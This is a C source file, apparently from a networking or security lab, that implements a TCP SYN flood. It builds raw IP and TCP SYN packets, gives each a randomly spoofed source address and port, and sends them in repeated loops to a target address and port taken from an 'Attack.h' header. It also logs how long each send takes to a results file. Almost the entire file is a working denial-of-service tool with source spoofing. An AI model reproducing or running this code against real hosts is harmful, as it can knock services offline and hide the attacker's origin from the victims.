#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#include "Attack.h"


/**
 * @brief this function calculates the checksum field for Internet Protocol header
 * @param ip pointer to IP header of the packet
 * @return the checksum of the IP
*/
uint16_t calculate_ip_checksum(struct iphdr *ip)
{
    uint32_t sum = 0;
    uint16_t *ip_hdr = (uint16_t*)ip;

    for (int i = 0; i < (ip->ihl * 2); i++)
    {
        sum += ntohs(ip_hdr[i]);
    }

    while (sum >> 16) 
    {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    sum = ~sum;

    return (uint16_t)sum;
}


/**
 * @brief this this function calculates the checksum field for Transmition Control Protocol header
 * @param ip pointer to IP header of the packet
 * @param tcp pointer to TCP header of the packet
 * @return the checksum of the TCP
*/
uint16_t calculate_tcp_checksum(struct iphdr *ip, struct tcphdr *tcp)
{
    uint32_t sum = 0;

    sum += (ip->saddr >> 16) & 0xFFFF;
    sum += ip->saddr & 0xFFFF;
    sum += (ip->daddr >> 16) & 0xFFFF;
    sum += ip->daddr & 0xFFFF;
    sum += htons(IPPROTO_TCP);
    sum += htons(sizeof(struct tcphdr));

    uint16_t *tcp_hdr = (uint16_t*) tcp;
    for (int i = 0; i < sizeof(struct tcphdr) / 2; i++)
    {
        sum += ntohs(tcp_hdr[i]);
    }

    if (tcp->doff * 4 > sizeof(struct tcphdr)) {
        sum += ntohs(*(uint16_t*) ((char*) tcp + sizeof(struct tcphdr)));
    }

    while (sum >> 16)
    {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    sum = ~sum;

    return (uint16_t)sum;
}


/**
 * @brief this function generates a random port number between 1024 and 65535 (include both)
 * @return a radom port number
*/
int get_random_port()
{
    return (int)(rand() % (65535 - 1024 + 1) + 1024);
}


/**
 * @brief this function generates a random IPv4 address
 * @param sockfd socket file descriptor
 * @param file pointer to results file
 * @note we need sockfd, file only to free them in case of calloc() fail
 * @return a random IPv4 address
*/
char* get_random_ipv4(int sockfd, FILE *file)
{
    char *ipv4 = NULL;
    ipv4 = (char*)calloc(16, sizeof(char));
    if(ipv4 == NULL)
    {
        perror("calloc() failed");
        close(sockfd);
        fclose(file);
        exit(errno);

    }
    sprintf(ipv4, "%d.%d.%d.%d", (rand() % 256), (rand() % 256), (rand() % 256), (rand() % 256));
    return ipv4;
}


/**
 * @brief this function sets up the IP header
 * @param targer pointer to address of the target machine
 * @param ip pointer to IP header of the packet
 * @param sockfd socket file descriptor
 * @param file file pointer
 * @note we need sockfd, file only to free them in case of calloc() fail
 */
void set_ip_layer(struct sockaddr_in *target, struct iphdr *ip, int sockfd, FILE *file)
{
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    ip->id = htons(1);
    ip->frag_off = htons(0);
    ip->ttl = 64;
    ip->protocol = IPPROTO_TCP;

    char *ipv4 = NULL;
    ipv4 = get_random_ipv4(sockfd, file);
    ip->saddr = inet_addr(ipv4);
    free(ipv4);

    ip->daddr = target->sin_addr.s_addr;
    ip->check = calculate_ip_checksum(ip);
}


/**
 * @brief this function sets up the IP header
 * @param targer pointer to address of the target machine
 * @param ip pointer to IP header of the packet
 * @param tcp pointer to TCP header of the packet
*/
void set_tcp_layer(struct sockaddr_in *target, struct iphdr *ip, struct tcphdr *tcp)
{
    tcp->source = htons(get_random_port());
    tcp->dest = target->sin_port;
    tcp->seq = htonl(0);
    tcp->ack_seq = 0;
    tcp->doff = 5;
    tcp->fin = 0;
    tcp->syn = 1;
    tcp->rst = 0;
    tcp->psh = 0;
    tcp->ack = 0;
    tcp->urg = 0;
    tcp->window = htons(8192);
    tcp->urg_ptr = 0;
    tcp->check = calculate_tcp_checksum(ip, tcp);
}


int main(int argc, char *argv[])
{
    srand(time(NULL)); // setting random seed

    int sock = 0; // creating raw socket
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(sock <= 0)
    {
        perror("socket() failed");
        exit(errno);
    }   

    int buffer_size = 1024 * 1024; // increasing buffer size of send packets
    if(setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(int)) < 0)
    {
        perror("buffer-size setsockopt() failed");
        close(sock);
        exit(errno);
    }

    int optval = 1; // including IP header when sending packets
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(int)) < 0)
    {
        perror("IP setsockopt() failed");
        close(sock);
        exit(errno);
    }

    FILE *file = NULL; // opening the results file for writing 
    file = fopen(RESULTS_FILE, "w");
    if(file == NULL)
    {
        perror("fopen() failed");
        close(sock);
        exit(errno);
    }

    struct sockaddr_in target_addr = {0}; // setting up the target's address and port
    memset(&target_addr, 0, sizeof(struct sockaddr_in));
    target_addr.sin_family = AF_INET;
    target_addr.sin_addr.s_addr = inet_addr(TARGET_IP_ADDR);
    target_addr.sin_port = htons(TARGET_PORT);

    struct iphdr ip_header = {0}; // creating IP header
    memset(&ip_header, 0, sizeof(struct iphdr));

    struct tcphdr tcp_header = {0}; // creating TCP header
    memset(&tcp_header, 0, sizeof(struct tcphdr));

    char syn_packet[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0}; // creating the TCP-SYN packet 
    memset(syn_packet, 0, sizeof(syn_packet));

    int i = 0, j = 0; 
    size_t sent = 0;

    double avg = 0.0;
    struct timeval start = {0}, end = {0}; // creating structs for calculate timings

    for(i = 0; i < NUM_ITERATIONS; i++)
    {
        for(j = 0; j < NUM_PACKETS; j++)
        {
            set_ip_layer(&target_addr, &ip_header, sock, file); // setting up the layers
            set_tcp_layer(&target_addr, &ip_header, &tcp_header);

            memset(syn_packet, 0, sizeof(syn_packet)); // setting up the packet
            memcpy(syn_packet, &ip_header, sizeof(ip_header));
            memcpy(syn_packet + sizeof(ip_header), &tcp_header, sizeof(tcp_header));

            memset(&start, 0, sizeof(struct timeval)); // cleaning the timing structs
            memset(&end, 0, sizeof(struct timeval));
            
            gettimeofday(&start, NULL); // sending the packet and calculating times
            sent = sendto(sock, syn_packet, sizeof(ip_header) + sizeof(tcp_header), 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
            gettimeofday(&end, NULL);

            if(sent <= 0)
            {
                perror("sendto() failed");
                close(sock);
                fclose(file);
                exit(errno);
            }

            avg += (end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0; // time in SECONDS

            fprintf(file, "%d %f\n", (i * NUM_PACKETS + j), ((end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0));
        
            sleep(TIMEOUT); //timeout between packets, maybe remove
        }
    }

    avg /= NUM_ITERATIONS * NUM_PACKETS;
    fprintf(file, "%f", avg);

    close(sock);
    fclose(file);

    return 0;
}
